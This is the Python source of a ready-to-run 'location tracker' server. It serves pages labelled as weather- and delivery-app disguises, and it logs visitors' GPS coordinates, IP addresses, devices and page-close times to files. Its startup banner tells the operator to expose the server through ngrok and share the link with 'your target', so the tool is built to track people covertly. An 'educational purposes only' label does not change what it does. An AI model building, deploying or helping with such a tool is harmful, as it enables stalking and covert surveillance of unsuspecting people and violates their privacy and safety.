#!/usr/bin/env python3
"""
Real-Time Location Tracker Server v3.0 - Hacker Theme (Fixed)
With Disconnect Notification Feature
For Educational Purposes Only
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime
import os
import sys
from urllib.parse import urlparse

# ============================================
# THEME COLORS - Matrix/Hacker Style
# ============================================
GREEN = '\033[92m'
DARK_GREEN = '\033[32m'
BRIGHT_GREEN = '\033[92m'
CYAN = '\033[96m'
RED = '\033[91m'
YELLOW = '\033[93m'
PURPLE = '\033[95m'
BLUE = '\033[94m'
WHITE = '\033[97m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'
BLINK = '\033[5m'

# Matrix-style banner
MATRIX_BANNER = f"""
{GREEN}{BOLD}╔══════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  {CYAN}██╗      ██████╗  ██████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗{GREEN}  ║
║  {CYAN}██║     ██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║{GREEN}  ║
║  {CYAN}██║     ██║   ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║{GREEN}  ║
║  {CYAN}██║     ██║   ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║{GREEN}  ║
║  {CYAN}███████╗╚██████╔╝╚██████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║{GREEN}  ║
║  {CYAN}╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝{GREEN}  ║
║                                                                      ║
║  {DARK_GREEN}⚡ REAL-TIME LOCATION TRACKER v3.0 ⚡{GREEN}                         ║
║  {DIM}Cybersecurity Student Project - Educational Purpose Only{DIM}{GREEN}        ║
╚══════════════════════════════════════════════════════════════════════╝{RESET}
"""

PORT = 8080
LOG_FILE = "locations.log"

class LocationHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == '/':
            self.serve_html('weather.html')
        elif path == '/weather':
            self.serve_html('weather.html')
        elif path == '/delivery':
            self.serve_html('delivery.html')
        elif path == '/index':
            self.serve_html('index.html')
        elif path == '/map':
            self.serve_html('map.html')
        elif path == '/health':
            self.serve_health()
        elif path == '/locations':
            self.serve_locations()
        else:
            self.serve_static(path)

    def serve_html(self, filename):
        try:
            with open(filename, 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_error(404, f"File {filename} not found")

    def serve_static(self, path):
        if path.startswith('/'):
            path = path[1:]
        if '..' in path:
            self.send_error(403)
            return
        try:
            if os.path.exists(path) and os.path.isfile(path):
                with open(path, 'rb') as f:
                    content = f.read()
                ext = path.split('.')[-1]
                ctype = {'css':'text/css','js':'application/javascript','png':'image/png','jpg':'image/jpeg'}.get(ext, 'application/octet-stream')
                self.send_response(200)
                self.send_header('Content-type', ctype)
                self.send_header('Content-Length', str(len(content)))
                self.end_headers()
                self.wfile.write(content)
            else:
                self.send_error(404)
        except Exception:
            self.send_error(500)

    def serve_health(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        resp = {'status':'ok','timestamp':datetime.now().isoformat()}
        self.wfile.write(json.dumps(resp).encode())

    def serve_locations(self):
        locations = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as f:
                raw = f.read()
                entries = raw.split('='*60)
                for entry in entries:
                    if entry.strip():
                        lines = entry.strip().split('\n')
                        loc = {}
                        for line in lines:
                            if ':' in line:
                                k, v = line.split(':', 1)
                                k = k.strip()
                                v = v.strip()
                                if k == 'Time': loc['time'] = v
                                elif k == 'Latitude': loc['latitude'] = float(v)
                                elif k == 'Longitude': loc['longitude'] = float(v)
                                elif k == 'Accuracy': loc['accuracy'] = v.replace(' meters','')
                                elif k == 'Google Maps': loc['map_url'] = v
                                elif k == 'Client IP': loc['client_ip'] = v
                                elif k == 'Device': loc['device'] = v
                                elif k == 'Source': loc['source'] = v
                        if 'latitude' in loc and 'longitude' in loc:
                            locations.append(loc)
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(locations[-100:]).encode())

    def do_POST(self):
        parsed = urlparse(self.path)
        if parsed.path == '/location':
            self.receive_location()
        elif parsed.path == '/disconnect':
            self.handle_disconnect()
        else:
            self.send_error(404)

    def receive_location(self):
        length = int(self.headers.get('Content-Length', 0))
        data = json.loads(self.rfile.read(length).decode())
        self.process_location(data)
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'status':'success'}).encode())

    def handle_disconnect(self):
        """Handle user disconnect notification"""
        length = int(self.headers.get('Content-Length', 0))
        data = json.loads(self.rfile.read(length).decode())
        
        ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ip = self.client_address[0]
        src = data.get('source', 'unknown')
        ua = data.get('userAgent', '')
        
        # Format device info
        device = 'Unknown'
        if 'Chrome' in ua: device = 'Chrome'
        elif 'Firefox' in ua: device = 'Firefox'
        elif 'Safari' in ua: device = 'Safari'
        elif 'Edge' in ua: device = 'Edge'
        if 'Android' in ua: device += ' on Android'
        elif 'iPhone' in ua or 'iPad' in ua: device += ' on iOS'
        elif 'Windows' in ua: device += ' on Windows'
        elif 'Mac' in ua: device += ' on macOS'
        elif 'Linux' in ua: device += ' on Linux'
        
        # Print disconnect notification in RED
        print(f"""
{RED}┌─────────────────────────────────────────────────────────────────────┐
│ {BOLD}🔴 USER DISCONNECTED{RESET}{RED}                                       │
├─────────────────────────────────────────────────────────────────────┤
│ {YELLOW}⏱  TIME{RESET}        {WHITE}{ts}{RESET}
│ {YELLOW}🌐  CLIENT IP{RESET}    {WHITE}{ip}{RESET}
│ {YELLOW}📱  DEVICE{RESET}      {WHITE}{device}{RESET}
│ {YELLOW}📦  SOURCE{RESET}      {WHITE}{src}{RESET}
│ {YELLOW}💬  STATUS{RESET}      {RED}User closed the page{RESET}
└─────────────────────────────────────────────────────────────────────┘
{RESET}""")
        
        # Log to file
        with open(LOG_FILE, 'a') as f:
            f.write(f"""
{'='*60}
🔴 USER DISCONNECTED
Time: {ts}
Client IP: {ip}
Device: {device}
Source: {src}
Status: User closed the page
{'='*60}
""")
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'status':'ok'}).encode())

    def get_location_count(self):
        """Safely count locations in log file"""
        if not os.path.exists(LOG_FILE):
            return 0
        try:
            with open(LOG_FILE, 'r') as f:
                content = f.read()
                return content.count('📍 LOCATION UPDATE')
        except:
            return 0

    def process_location(self, data):
        ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        lat = data.get('latitude', 'N/A')
        lon = data.get('longitude', 'N/A')
        acc = data.get('accuracy', 'N/A')
        src = data.get('source', 'unknown')
        ip = self.client_address[0]
        ua = data.get('userAgent', '')
        device = 'Unknown'
        if 'Chrome' in ua: device = 'Chrome'
        elif 'Firefox' in ua: device = 'Firefox'
        elif 'Safari' in ua: device = 'Safari'
        elif 'Edge' in ua: device = 'Edge'
        if 'Android' in ua: device += ' on Android'
        elif 'iPhone' in ua or 'iPad' in ua: device += ' on iOS'
        elif 'Windows' in ua: device += ' on Windows'
        elif 'Mac' in ua: device += ' on macOS'
        elif 'Linux' in ua: device += ' on Linux'

        # Get current count
        count = self.get_location_count() + 1

        # ==========================================
        # HACKER-THEMED LOCATION OUTPUT
        # ==========================================
        print(f"""
{BRIGHT_GREEN}┌─────────────────────────────────────────────────────────────────────┐
│ {BOLD}{CYAN}📍 INCOMING LOCATION PACKET DETECTED{RESET}{BRIGHT_GREEN}                    │
├─────────────────────────────────────────────────────────────────────┤
│ {YELLOW}⏱  TIMESTAMP{RESET}    {WHITE}{ts}{RESET}
│ {YELLOW}🌐  CLIENT IP{RESET}    {WHITE}{ip}{RESET}
│ {YELLOW}📱  DEVICE{RESET}      {WHITE}{device}{RESET}
│ {YELLOW}📦  SOURCE{RESET}      {WHITE}{src}{RESET}
├─────────────────────────────────────────────────────────────────────┤
│ {GREEN}📍 COORDINATES{RESET}                                      │
│   {CYAN}LATITUDE{RESET}   {WHITE}{lat}{RESET}
│   {CYAN}LONGITUDE{RESET}  {WHITE}{lon}{RESET}
│   {CYAN}ACCURACY{RESET}   {WHITE}{acc} meters{RESET}
├─────────────────────────────────────────────────────────────────────┤
│ {BLUE}🗺  GOOGLE MAPS LINK{RESET}                                  │
│   {DIM}https://www.google.com/maps?q={lat},{lon}{RESET}
└─────────────────────────────────────────────────────────────────────┘
{GREEN}▸ Packet #{count} logged successfully.{RESET}
""")

        # Log to file
        log = f"""
{'='*60}
📍 LOCATION UPDATE #{count}
Time: {ts}
Client IP: {ip}
Source: {src}
Latitude:  {lat}
Longitude: {lon}
Accuracy:  {acc} meters
Device:    {device}
Google Maps: https://www.google.com/maps?q={lat},{lon}
{'='*60}
"""
        with open(LOG_FILE, 'a') as f:
            f.write(log + '\n')
        
        # CSV
        csv = "locations.csv"
        exists = os.path.isfile(csv)
        with open(csv, 'a') as f:
            if not exists:
                f.write("timestamp,latitude,longitude,accuracy,client_ip,device,source\n")
            f.write(f"{ts},{lat},{lon},{acc},{ip},{device},{src}\n")

    def log_message(self, format, *args):
        pass

def clear_logs():
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
        print(f"{GREEN}🗑️  Removed {LOG_FILE}{RESET}")
    if os.path.exists("locations.csv"):
        os.remove("locations.csv")
        print(f"{GREEN}🗑️  Removed locations.csv{RESET}")

def check_files():
    required = ['weather.html', 'delivery.html', 'index.html']
    missing = []
    for file in required:
        if not os.path.exists(file):
            missing.append(file)
    
    if missing:
        print(f"{YELLOW}⚠️  Warning: Missing files{RESET}")
        for file in missing:
            print(f"   {RED}❌ {file} not found{RESET}")
        print(f"\n{DIM}These files are optional but recommended:{RESET}")
        print("   - weather.html (Weather app disguise)")
        print("   - delivery.html (Delivery app disguise)")
        print("   - index.html (Original tracker)")
        return False
    else:
        print(f"{GREEN}✅ All required files found{RESET}")
        return True

def run():
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print(MATRIX_BANNER)
    
    print(f"{DARK_GREEN}│ {BOLD}INITIALIZING SYSTEM...{RESET}{DARK_GREEN}")
    print(f"│ {DIM}Loading modules...{RESET}{DARK_GREEN}")
    print(f"│ {DIM}Checking dependencies...{RESET}{DARK_GREEN}")
    print(f"├─────────────────────────────────────────────────────────────┤{RESET}")
    
    check_files()
    
    if os.path.exists(LOG_FILE) or os.path.exists("locations.csv"):
        response = input(f"\n{YELLOW}📂 Log files exist. Clear them? (y/n): {RESET}").lower()
        if response == 'y':
            clear_logs()
    
    server = HTTPServer(('0.0.0.0', PORT), LocationHandler)
    
    print(f"""
{GREEN}┌─────────────────────────────────────────────────────────────────────┐
│ {BOLD}{CYAN}📡 SERVER STATUS: ONLINE{RESET}{GREEN}                                  │
├─────────────────────────────────────────────────────────────────────┤
│ {WHITE}📍 Local URL:{RESET}     http://localhost:{PORT}
│ {WHITE}📱 Public URL:{RESET}    http://YOUR_IP:{PORT}
│ {WHITE}📁 Log file:{RESET}      {LOG_FILE}
│ {WHITE}📊 CSV file:{RESET}      locations.csv
├─────────────────────────────────────────────────────────────────────┤
│ {BOLD}{YELLOW}📋 AVAILABLE ENDPOINTS{RESET}{GREEN}                               │
│   {CYAN}🌤️  Weather{RESET}    http://localhost:{PORT}/
│   {CYAN}🍔  Delivery{RESET}   http://localhost:{PORT}/delivery
│   {CYAN}📍  Original{RESET}   http://localhost:{PORT}/index
│   {CYAN}🗺️   Map{RESET}       http://localhost:{PORT}/map
│   {CYAN}❤️   Health{RESET}    http://localhost:{PORT}/health
│   {CYAN}📊  Locations{RESET}  http://localhost:{PORT}/locations
├─────────────────────────────────────────────────────────────────────┤
│ {BOLD}{PURPLE}🔗 PUBLIC ACCESS (ngrok){RESET}{GREEN}                            │
│   {DIM}Start ngrok with: ngrok http {PORT}{RESET}
│   {DIM}Then use: https://YOUR_NGROK_URL.ngrok-free.dev{RESET}
├─────────────────────────────────────────────────────────────────────┤
│ {BOLD}{BLUE}💡 INSTRUCTIONS{RESET}{GREEN}                                       │
│ 1. Keep this terminal running
│ 2. In another terminal: ngrok http {PORT}
│ 3. Update SERVER_URL in HTML files with your ngrok URL
│ 4. Share the ngrok URL with your target
├─────────────────────────────────────────────────────────────────────┤
│ {BOLD}{RED}⚠️  Press Ctrl+C to stop the server{RESET}{GREEN}                     │
└─────────────────────────────────────────────────────────────────────┘
{RESET}
""")
    
    print(f"{DIM}{BLINK}▸ Waiting for incoming connections...{RESET}\n")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        count = 0
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as f:
                count = f.read().count('📍 LOCATION UPDATE')
        
        print(f"\n\n{YELLOW}┌─────────────────────────────────────────────────────────────────────┐{RESET}")
        print(f"{YELLOW}│ {BOLD}🛑 SERVER SHUTDOWN INITIATED{RESET}{YELLOW}                              │{RESET}")
        print(f"{YELLOW}├─────────────────────────────────────────────────────────────────────┤{RESET}")
        print(f"{YELLOW}│ 📊 Total locations tracked: {GREEN}{count}{YELLOW}                               │{RESET}")
        print(f"{YELLOW}│ 📁 Logs saved to: {GREEN}{LOG_FILE}{YELLOW}                              │{RESET}")
        print(f"{YELLOW}│ 📈 Data exported to: {GREEN}locations.csv{YELLOW}                          │{RESET}")
        print(f"{YELLOW}└─────────────────────────────────────────────────────────────────────┘{RESET}")
        print(f"\n{GREEN}✓ Server stopped successfully.{RESET}\n")
        server.shutdown()

if __name__ == '__main__':
    run()
